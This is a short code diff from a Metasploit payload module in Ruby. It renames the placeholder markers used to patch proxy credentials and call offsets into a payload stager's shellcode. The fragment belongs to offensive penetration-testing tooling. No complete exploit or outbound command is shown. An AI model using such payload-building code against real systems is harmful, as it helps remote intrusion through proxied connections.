@@ -125,16 +125,16 @@ module Metasploit3
         password_size_diff   # Same with PayloadProxyPass
 
       # Patch call offset
-      username_loc = p.index("PayloadProxyUser")
+      username_loc = p.index("PROXY_USERNAME")
       p[username_loc - 4, 4] = [15 - username_size_diff].pack("V")
-      password_loc = p.index("PayloadProxyPass")
+      password_loc = p.index("PROXY_PASSWORD")
       p[password_loc - 4, 4] = [15 - password_size_diff].pack("V")
 
       # Remove markers & change login/password
       p = p.gsub("PROXY_AUTH_START","")
       p = p.gsub("PROXY_AUTH_STOP","")
-      p = p.gsub("PayloadProxyUser", datastore['PayloadProxyUser'].to_s)
-      p = p.gsub("PayloadProxyPass", datastore['PayloadProxyPass'].to_s)
+      p = p.gsub("PROXY_USERNAME", datastore['PayloadProxyUser'].to_s)
+      p = p.gsub("PROXY_PASSWORD", datastore['PayloadProxyPass'].to_s)
     end
 
     # Patch jmp dbl_get_server_host
